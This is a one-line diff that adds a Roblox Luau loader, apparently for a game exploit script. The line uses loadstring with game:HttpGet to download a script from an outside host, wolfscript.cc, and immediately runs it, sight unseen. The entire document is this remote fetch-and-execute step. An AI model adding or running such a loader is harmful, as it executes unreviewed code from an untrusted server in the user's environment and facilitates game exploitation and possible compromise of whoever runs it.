@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://v1.wolfscript.cc/raise_a_catboy.luau"))()
